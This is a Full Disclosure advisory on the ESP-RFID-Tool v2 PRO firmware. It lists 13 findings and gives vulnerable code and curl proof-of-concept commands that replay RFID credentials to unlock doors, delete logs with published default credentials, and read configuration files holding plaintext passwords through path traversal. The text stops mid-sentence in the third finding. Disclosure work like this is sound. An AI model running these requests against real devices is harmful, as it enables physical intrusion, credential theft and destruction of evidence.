---
title: ESP-RFID-Tool v2 PRO — Full Public Disclosure
url: https://seclists.org/fulldisclosure/2026/Apr/18
source: Full Disclosure
date: 2026-04-29
fetch_date: 2026-04-30T05:30:36.716454
---

# ESP-RFID-Tool v2 PRO — Full Public Disclosure

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#18)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#18)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# ESP-RFID-Tool v2 PRO — Full Public Disclosure

---

*From*: Milan Berger via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 28 Apr 2026 20:08:50 +0200

---

```
# Security Advisory: ESP-RFID-Tool v2 PRO

**Product:** ESP-RFID-Tool v2 PRO
**Vendor:** Raik Schneider (Einstein2150), foto-video-it.de
**Repository:** https://github.com/Einstein2150/ESP-RFID-Tool-v2
**Affected Version:** v2.2.1 (latest as of 2026-04-28)
**Severity:** CRITICAL
**Disclosure Type:** Full Public Disclosure
**Disclosure Date:** 2026-04-28
**Researcher:** Milan 't4c' Berger

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-04-26 | Vulnerabilities discovered during code review |
| 2026-04-27 | Researcher posted responsible disclosure comment on his
advertisement on Youtube (GitHub issues disabled by vendor) |
| 2026-04-28 | Vendor deleted the disclosure comment without response |
| 2026-04-28 | Researcher posted responsible disclosure comment again on
his advertisement on Youtube (GitHub issues disabled by vendor) |
| 2026-04-28 | Vendor deleted the disclosure comment without response |
| 2026-04-28 | Researcher attempted contact via additional social media
channels |
| 2026-04-28 | Vendor blocked researcher on all contacted channels; no
acknowledgment given |
| 2026-04-28 | Full public disclosure — 48h contact window exhausted,
vendor uncooperative |

---

## Summary

The ESP-RFID-Tool v2 PRO is a commercial hardware/firmware product sold by
Raik Schneider targeting security researchers and red team operators. It is
based on an ESP8266 microcontroller and provides a web interface for
logging, replaying, and analyzing Wiegand RFID data from physical access
control systems.

Multiple critical security vulnerabilities were identified in firmware
v2.2.1. The most severe findings allow any unauthenticated attacker with
network access to: replay captured RFID credentials against physical door
locks, read the complete device configuration including plaintext
passwords, and permanently destroy all captured evidence — all without
authentication.

Note: A full practical verification of all exploits involving physical
signal transmission could not be performed as no Wiegand access terminal
was available during testing.

The vendor was notified through all available channels. All notifications
were deleted, and the researcher was blocked. Full disclosure follows.

---

## Vulnerability Summary

| ID | Severity | Title |
|----|----------|-------|
| ESPR-01 | **CRITICAL** | Unauthenticated Wiegand TX — Physical Access
Control Bypass |
| ESPR-02 | **MEDIUM** | Log Deletion via Default Credentials (Auth
present, but trivially bypassed) |
| ESPR-03 | **CRITICAL** | Path Traversal — Arbitrary SPIFFS File Read |
| ESPR-04 | **HIGH** | Reflected Cross-Site Scripting (XSS) |
| ESPR-05 | **HIGH** | Stored XSS via Log Injection |
| ESPR-06 | **HIGH** | Hardcoded Default Credentials |
| ESPR-07 | **HIGH** | Unauthenticated Log View + Filesystem Enumeration |
| ESPR-08 | **MEDIUM** | No CSRF Protection — Entire Application |
| ESPR-09 | **MEDIUM** | Plaintext FTP Server |
| ESPR-10 | **MEDIUM** | Missing Security Response Headers |
| ESPR-11 | **MEDIUM** | No Input Validation on Integer Parameters |
| ESPR-12 | **LOW** | Predictable AP SSID — Device Fingerprinting |
| ESPR-13 | **INFO** | Captive Portal Mode Widens Attack Surface |

---

## Detailed Findings

---

### ESPR-01 — Unauthenticated Wiegand TX: Physical Access Control Bypass

**Severity:** CRITICAL
**File:** `api_server.cpp`
**Endpoints:** `/api/tx/bin`, `/api/txinstant/bin`, `/api/wiegandencode`

**Description:**
All Wiegand transmission API endpoints execute hardware TX operations
without any authentication check. Any attacker on the same network can
replay arbitrary Wiegand bitstreams to downstream access control hardware —
unlocking physical doors, gates, or secured areas — with a single
unauthenticated HTTP GET request.

**Vulnerable Code:**
```cpp
server.on("/api/tx/bin", []() {
    // ...
    // No server.authenticate() call
    apiTX(api_binary, api_pulsewidth, api_datainterval, api_wait);
});
```

**Proof of Concept:**
```bash
# Replay a captured 26-bit HID card to open a door
curl "
http://192.168.1.1/api/tx/bin?binary=01001100110101010110101001&pulsewidth=40&interval=2000
"

# Re-encode a known UID and transmit
curl "http://192.168.1.1/api/wiegandencode?uid=DEADBEEF&format=26";

# Instant transmission (no response wait)
curl "http://192.168.1.1/api/txinstant/bin?binary=01001100110101010110101001
"
```

**Impact:**
Physical security bypass. An attacker who previously captured a card UID
(e.g. via ESPR-07) can immediately replay it to open the corresponding door
— all from an unauthenticated HTTP request. This completely undermines the
device's operational security model.

---

### ESPR-02 — Log Deletion via Default Credentials

**Severity:** MEDIUM
**File:** `esprfidtool.ino`
**Endpoints:** `/deletelog`, `/deletelog/yes`

**Description:**
`/deletelog/yes` requires HTTP Basic Authentication. However, the default
credentials (`admin:rfidtool`) are hardcoded and publicly known via the
open-source repository. Combined with ESPR-06, any attacker with knowledge
of the default credentials can permanently delete all captured RFID logs.
`/deletelog` (the confirmation page) has **no authentication**, which also
makes it a direct XSS vector (see ESPR-04).

**Note:** Live testing confirmed `/deletelog/yes` returns HTTP 401 without
credentials. This finding was initially rated CRITICAL based on static code
analysis of an earlier version; auth is present in the tested build.

**Vulnerable Code:**
```cpp
server.on("/deletelog/yes", [](){
  if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
  // Auth present — but default credentials are public (admin:rfidtool)
  SPIFFS.remove(deletelog);
});
```

**Proof of Concept:**
```bash
# Delete log using publicly known default credentials
curl -u admin:rfidtool "http://192.168.1.1/deletelog/yes?payload=/log.txt";
```

**Impact:**
Any attacker who knows the default credentials (publicly available) can
permanently destroy all captured evidence. Severity is driven by ESPR-06
(hardcoded defaults) — fixing one without the other provides no real
protection.

---

### ESPR-03 — Path Traversal: Arbitrary SPIFFS File Read

**Severity:** CRITICAL
**File:** `esprfidtool.ino` — `ViewLog()`

**Description:**
The `payload` parameter is passed directly to `SPIFFS.open()` without any
path validation or sanitization. An unauthenticated attacker can read any
file stored in the device's SPIFFS filesystem, including configuration
files containing plaintext credentials.

**Vulnerable Code:**
```cpp
void ViewLog(){
  String payload;
  payload += server.arg(0);  // raw URL arg, no sanitization
  File f = SPIFFS.open(payload, "r");
  // outputs file content directly to browser
}
```

**Proof of Concept:**
```bash
# Note: server.arg(0) reads the FIRST URL argument by position, not by name.
# The correct syntax is ?<filename>, not ?payload=<filename>

# Read device configuration (contains credentials in plaintext)
curl "http://192.168.1.1/viewlog?/esprfidtool.json";

# Read log files (enumerate first vi...